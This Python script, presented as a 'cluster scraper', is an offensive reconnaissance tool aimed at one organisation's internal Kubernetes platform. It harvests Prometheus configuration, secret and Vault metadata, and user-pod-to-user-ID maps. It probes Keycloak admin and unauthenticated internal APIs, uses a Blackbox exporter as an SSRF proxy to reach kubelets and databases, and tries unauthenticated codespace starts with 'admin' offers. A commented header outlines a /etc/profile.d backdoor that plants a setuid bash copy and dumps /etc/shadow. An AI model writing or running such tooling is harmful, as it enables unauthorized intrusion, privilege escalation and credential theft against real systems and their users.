#!/usr/bin/env python3
"""
cluster_scraper.py
Scrapes all open endpoints and saves dated JSON files
"""

# We confirmed /etc/profile.d is writable
# Plant a backdoor and wait for a root-running cron job
# or admin login to trigger it

#cat > /etc/profile.d/005-bash-options.sh << 'EOF'
#cp /bin/bash /tmp/.b && chmod +s /tmp/.b
#cat /etc/shadow > /tmp/.shadow 2>/dev/null
#env > /tmp/.env_root
#EOF

# Then check periodically:
#ls -la /tmp/.b /tmp/.shadow 2>/dev/null


import requests, json, re, socket, os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

# ── Config ────────────────────────────────────────────────
PROMETHEUS  = "http://198.18.19.18:9090"
KUBE_STATE  = "http://198.18.120.137:8080"
NODE_EXP    = "http://198.18.13.70:9100"
BLACKBOX    = "http://198.18.12.79:9115"
PROM_OP     = "http://198.18.3.197:8080"
TRAEFIK     = "http://198.18.116.44:8080"

INTERNAL = {
    "api":          "https://api.studio.sparrow.cloud.echonet.net.intra",
    "gatekeeper":   "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra",
    "offer":        "https://offer.studio.sparrow.cloud.echonet.net.intra",
    "project":      "https://project.studio.sparrow.cloud.echonet.net.intra",
    "wheelbuilder": "https://wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
    "rbac":         "https://rbac.studio.sparrow.cloud.echonet.net.intra",
    "sparrot":      "https://sparrot.studio.sparrow.cloud.echonet.net.intra",
}

KEYCLOAK = "https://auth.sparrow.cloud.echonet"
REALM    = "ap26882-prod"

DATE_STR = datetime.now().strftime("%Y%m%d_%H%M%S")
OUT_DIR  = f"./scrape_{DATE_STR}"
os.makedirs(OUT_DIR, exist_ok=True)

# ── Helpers ───────────────────────────────────────────────
def get(url, params=None, timeout=15):
    try:
        r = requests.get(url, params=params,
                        verify=False, timeout=timeout)
        return r
    except Exception as e:
        return None

def promql(query, timeout=30):
    r = get(f"{PROMETHEUS}/api/v1/query",
            {"query": query}, timeout)
    if r and r.status_code == 200:
        return r.json().get("data", {}).get("result", [])
    return []

def save(name, data):
    path = f"{OUT_DIR}/{name}.json"
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"  saved → {path} ({len(json.dumps(data))} bytes)")
    return path

def section(title):
    print(f"\n{'='*60}\n  {title}\n{'='*60}")

# ── Scrapers ──────────────────────────────────────────────

def scrape_prometheus():
    section("PROMETHEUS")
    results = {}

    # Runtime info
    r = get(f"{PROMETHEUS}/api/v1/status/runtimeinfo")
    if r and r.status_code == 200:
        results["runtime"] = r.json().get("data", {})
        print(f"  Runtime: {results['runtime'].get('hostname')}")

    # Full config (209KB — all scrape targets)
    r = get(f"{PROMETHEUS}/api/v1/status/config", timeout=30)
    if r and r.status_code == 200:
        results["config"] = r.json().get("data", {})
        print(f"  Config: {len(results['config'].get('yaml',''))} bytes")

    # All active targets
    r = get(f"{PROMETHEUS}/api/v1/targets", timeout=30)
    if r and r.status_code == 200:
        data     = r.json()["data"]
        active   = data.get("activeTargets", [])
        dropped  = data.get("droppedTargets", [])
        results["targets_active"]  = active
        results["targets_dropped"] = dropped
        print(f"  Targets: {len(active)} active, "
              f"{len(dropped)} dropped")

    # Alert rules
    r = get(f"{PROMETHEUS}/api/v1/rules")
    if r and r.status_code == 200:
        results["rules"] = r.json().get("data", {})

    # All metric names
    r = get(f"{PROMETHEUS}/api/v1/label/__name__/values")
    if r and r.status_code == 200:
        results["metric_names"] = r.json().get("data", [])
        print(f"  Metrics: {len(results['metric_names'])} names")

    save("prometheus_full", results)


def scrape_k8s_objects():
    section("KUBERNETES OBJECTS (via PromQL)")
    results = {}

    queries = {
        # Inventory
        "pods":             'kube_pod_info',
        "services":         'kube_service_info',
        "namespaces":       'kube_namespace_labels',
        "nodes":            'kube_node_info',
        "deployments":      'kube_deployment_labels',

        # Security relevant
        "secrets":          'kube_secret_info',
        "service_accounts": 'kube_pod_spec_serviceaccount_info',
        "volumes":          'kube_pod_spec_volumes_persistentvolumeclaims_info',
        "host_network":     'kube_pod_spec_host_network',
        "privileged":       'kube_pod_container_info'
                            '{container_id!=""}',

        # External secrets
        "external_secrets": 'externalsecret_status_condition',
        "vault_secrets":    '{__name__=~"vault.*"}',

        # User pods specifically
        "user_pods":        'kube_pod_info'
                            '{namespace="sparrow-studio-prod"}',
        "user_services":    'kube_service_info'
                            '{namespace="sparrow-studio-prod"}',
    }

    for name, query in queries.items():
        results[name] = promql(query)
        print(f"  {name}: {len(results[name])} results")

    save("k8s_objects", results)

    # Extract user pod IP map specifically
    pod_map = []
    for item in results.get("user_pods", []):
        m       = item.get("metric", {})
        pod     = m.get("pod", "")
        node    = m.get("node", "")
        host_ip = m.get("host_ip", "")
        uid_m   = re.search(r'sop-([a-z0-9]+)-reg', pod)
        kind    = "jupyter" if "-jl-" in pod else \
                  "vscode"  if "-c-3-" in pod else "other"
        pod_map.append({
            "pod":     pod,
            "user_id": uid_m.group(1) if uid_m else "?",
            "kind":    kind,
            "node":    node,
            "host_ip": host_ip,
        })

    save("user_pod_map", pod_map)
    print(f"\n  User pods mapped: {len(pod_map)}")


def scrape_kube_state():
    section("KUBE-STATE-METRICS")
    r = get(f"{KUBE_STATE}/metrics", timeout=30)
    if not r or r.status_code != 200:
        print("  FAILED")
        return

    metrics_text = r.text
    results = {
        "raw_size":       len(metrics_text),
        "secret_owners":  [],
        "pod_volumes":    [],
        "env_vars":       [],
        "privileged":     [],
    }

    for line in metrics_text.splitlines():
        if line.startswith("#"):
            continue
        if "kube_secret_owner" in line:
            results["secret_owners"].append(line)
        if "kube_pod_spec_volumes" in line:
            results["pod_volumes"].append(line)
        if "container_env" in line.lower():
            results["env_vars"].append(line)
        if "privileged" in line.lower():
            results["privileged"].append(line)

    print(f"  Raw: {results['raw_size']} bytes")
    print(f"  Secret owners: {len(results['secret_owners'])}")
    print(f"  Privileged containers: {len(results['privileged'])}")

    save("kube_state_metrics", results)


def scrape_node_exporter():
    section("NODE EXPORTER")
    r = get(f"{NODE_EXP}/metrics", timeout=15)
    if not r or r.status_code != 200:
        print("  FAILED")
        return

    results = {
        "filesystem":  [],
        "network":     [],
        "system_info": [],
        "memory":      [],
    }

    for line in r.text.splitlines():
        if line.startswith("#"):
            continue
        if "node_filesystem" in line:
            results["filesystem"].append(line)
        elif "node_network" in line:
            results["network"].append(line)
        elif "node_uname" in line or "node_os" in line:
            results["system_info"].append(line)
        elif "node_memory" in line:
            results["memory"].append(line)

    save("node_exporter", results)
    print(f"  Filesystem entries: {len(results['filesystem'])}")


def scrape_internal_apis():
    section("INTERNAL APIs")
    results = {}

    for name, base in INTERNAL.items():
        svc_data = {"base_url": base, "endpoints": {}}

        # OpenAPI spec
        for spec_path in ["/openapi.json", "/docs",
                          "/swagger", "/redoc"]:
            r = get(f"{base}{spec_path}", timeout=5)
            if r and r.status_code == 200:
                try:
                    svc_data["openapi"] = r.json()
                    paths = list(
                        svc_data["openapi"].get("paths", {}).keys()
                    )
                    print(f"  {name}: {len(paths)} endpoints")
                except:
                    svc_data["openapi_raw"] = r.text[:5000]
                break

        # Health
        for hp in ["/health", "/healthz",
                   "/monitoring/live", "/ping"]:
            r = get(f"{base}{hp}", timeout=3)
            if r and r.status_code == 200:
                svc_data["health"] = {
                    "path":   hp,
                    "status": r.status_code,
                    "body":   r.text[:200]
                }
                break

        # Try unauthenticated endpoints
        unauth_endpoints = [
            "/api/v1/users",
            "/api/v1/roles",
            "/pa/users_info",
            "/pa/projects-with-buckets",
            "/pa/offers",
            "/authorize",
            "/cookie",
            "/builder",
        ]
        for ep in unauth_endpoints:
            r = get(f"{base}{ep}", timeout=3)
            if r and r.status_code not in [404, 000]:
                svc_data["endpoints"][ep] = {
                    "status": r.status_code,
                    "body":   r.text[:200]
                }

        results[name] = svc_data

    save("internal_apis", results)


def scrape_keycloak():
    section("KEYCLOAK")
    results = {}

    # Well-known
    r = get(
        f"{KEYCLOAK}/auth/realms/{REALM}"
        f"/.well-known/openid-configuration"
    )
    if r and r.status_code == 200:
        results["well_known"] = r.json()

    # Realm info + public key
    r = get(f"{KEYCLOAK}/auth/realms/{REALM}")
    if r and r.status_code == 200:
        results["realm"] = r.json()
        print(f"  Realm: {results['realm'].get('realm')}")
        print(f"  Public key: "
              f"{results['realm'].get('public_key','')[:40]}...")

    # Try to enumerate clients (usually 401)
    for ep in [
        f"/auth/admin/realms/{REALM}/clients",
        f"/auth/admin/realms/{REALM}/users",
        f"/auth/admin/realms/{REALM}/roles",
    ]:
        r = get(f"{KEYCLOAK}{ep}")
        results[ep] = {
            "status": r.status_code if r else 0,
            "body":   r.text[:200] if r else ""
        }
        print(f"  {ep}: {results[ep]['status']}")

    save("keycloak", results)


def scrape_traefik():
    section("TRAEFIK")
    results = {}

    for ep in ["/api/rawdata", "/api/http/routers",
               "/api/http/services", "/api/overview",
               "/api/version", "/ping"]:
        r = get(f"{TRAEFIK}{ep}", timeout=5)
        if r:
            results[ep] = {
                "status": r.status_code,
                "body":   r.text[:2000]
            }
            print(f"  {ep}: {r.status_code}")

    save("traefik", results)


def scrape_network_map():
    section("NETWORK MAP")
    results = {
        "cluster_ips":    {},
        "node_ips":       {},
        "internal_dns":   {},
        "pod_ip_map":     [],
    }

    # Get all service ClusterIPs
    svc_results = promql("kube_service_info")
    for item in svc_results:
        m   = item.get("metric", {})
        svc = m.get("service", "")
        ip  = m.get("cluster_ip", "")
        ns  = m.get("namespace", "")
        if ip and ip != "None":
            results["cluster_ips"][ip] = {
                "service":   svc,
                "namespace": ns,
            }

    print(f"  ClusterIPs: {len(results['cluster_ips'])}")

    # Get node IPs
    node_results = promql("kube_node_info")
    for item in node_results:
        m    = item.get("metric", {})
        node = m.get("node", "")
        results["node_ips"][node] = m

    print(f"  Nodes: {len(results['node_ips'])}")

    # Resolve internal hostnames
    internal_hosts = [
        "api.studio.sparrow.cloud.echonet.net.intra",
        "gatekeeper.studio.sparrow.cloud.echonet.net.intra",
        "offer.studio.sparrow.cloud.echonet.net.intra",
        "project.studio.sparrow.cloud.echonet.net.intra",
        "wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
        "rbac.studio.sparrow.cloud.echonet.net.intra",
        "auth.sparrow.cloud.echonet",
        "pgweb.studio.sparrow.cloud.echonet.net.intra",
        "mongol.studio.sparrow.cloud.echonet.net.intra",
        "redisc.studio.sparrow.cloud.echonet.net.intra",
        "vault.studio.sparrow.cloud.echonet.net.intra",
    ]
    for host in internal_hosts:
        try:
            ip = socket.gethostbyname(host)
            results["internal_dns"][host] = ip
            print(f"  DNS: {host} → {ip}")
        except:
            results["internal_dns"][host] = "UNRESOLVABLE"

    save("network_map", results)


def scrape_blackbox():
    section("BLACKBOX EXPORTER (as proxy)")
    results = {}

    # Probe internal services via blackbox
    probe_targets = [
        "https://pgweb.studio.sparrow.cloud.echonet.net.intra",
        "https://mongol.studio.sparrow.cloud.echonet.net.intra",
        "https://vault.studio.sparrow.cloud.echonet.net.intra/v1/sys/health",
        "http://198.18.120.137:8080/metrics",
        "http://10.26.163.7:10250/pods",
        "http://10.26.163.10:10250/pods",
        "http://198.18.121.197:5000/",
        "http://198.18.121.198:8081/",
    ]

    for target in probe_targets:
        r = get(f"{BLACKBOX}/probe",
                {"module": "http_2xx",
                 "target": target,
                 "debug":  "true"},
                timeout=15)
        if r:
            success = "1" in [
                line.split()[-1]
                for line in r.text.splitlines()
                if "probe_success" in line
                and not line.startswith("#")
            ]
            status_lines = [
                line for line in r.text.splitlines()
                if "probe_http_status_code" in line
                and not line.startswith("#")
            ]
            http_status = status_lines[0].split()[-1] \
                          if status_lines else "?"

            results[target] = {
                "success":     success,
                "http_status": http_status,
                "debug":       r.text[:2000],
            }
            icon = "✓" if success else "✗"
            print(f"  {icon} {target.split('//')[1][:50]}"
                  f" → {http_status}")

    # TCP probe for kubelet
    for host_port in ["10.26.163.7:10250",
                      "10.26.163.10:10250",
                      "10.26.163.29:10250"]:
        r = get(f"{BLACKBOX}/probe",
                {"module": "tcp_connect",
                 "target": host_port},
                timeout=5)
        if r:
            success = any(
                "probe_success 1" in line
                for line in r.text.splitlines()
            )
            results[f"tcp_{host_port}"] = {
                "success": success
            }
            print(f"  TCP {host_port}: "
                  f"{'OPEN' if success else 'CLOSED'}")

    save("blackbox_probes", results)


def scrape_codespace_api():
    section("CODESPACE API (unauthenticated endpoints)")
    results = {}
    base    = INTERNAL["api"]

    # Try all endpoints without auth
    endpoints = [
        "/codespaces",
        "/codespaces/home",
        "/issues/available_templates",
        "/keepalive",
        f"/pa/users/c91364/codespaces",
    ]

    for ep in endpoints:
        r = get(f"{base}{ep}", timeout=5)
        if r:
            results[ep] = {
                "status": r.status_code,
                "body":   r.text[:500]
            }
            print(f"  {ep}: {r.status_code}")

    # Try starting a codespace with different offers
    # This may work if the API doesn't check auth properly
    for offer_id in ["1", "2", "3", "admin", "privileged"]:
        r = requests.post(
            f"{base}/codespaces/start",
            params={"offer_id": offer_id,
                    "image_id": "default"},
            verify=False, timeout=5
        )
        if r and r.status_code not in [401, 403, 404, 422]:
            results[f"start_offer_{offer_id}"] = {
                "status": r.status_code,
                "body":   r.text[:500]
            }
            print(f"  start offer={offer_id}: "
                  f"{r.status_code} *** INTERESTING ***")

    save("codespace_api", results)


def main():
    print(f"Cluster Intelligence Scraper")
    print(f"Started: {DATE_STR}")
    print(f"Output:  {OUT_DIR}/")

    scrapers = [
        ("Prometheus",      scrape_prometheus),
        ("K8s Objects",     scrape_k8s_objects),
        ("Kube State",      scrape_kube_state),
        ("Node Exporter",   scrape_node_exporter),
        ("Internal APIs",   scrape_internal_apis),
        ("Keycloak",        scrape_keycloak),
        ("Traefik",         scrape_traefik),
        ("Network Map",     scrape_network_map),
        ("Blackbox",        scrape_blackbox),
        ("Codespace API",   scrape_codespace_api),
    ]

    for name, fn in scrapers:
        try:
            fn()
        except Exception as e:
            print(f"  ERROR in {name}: {e}")

    print(f"\n{'='*60}")
    print(f"Done. All output in: {OUT_DIR}/")
    print(f"Files: {os.listdir(OUT_DIR)}")

if __name__ == "__main__":
    main()
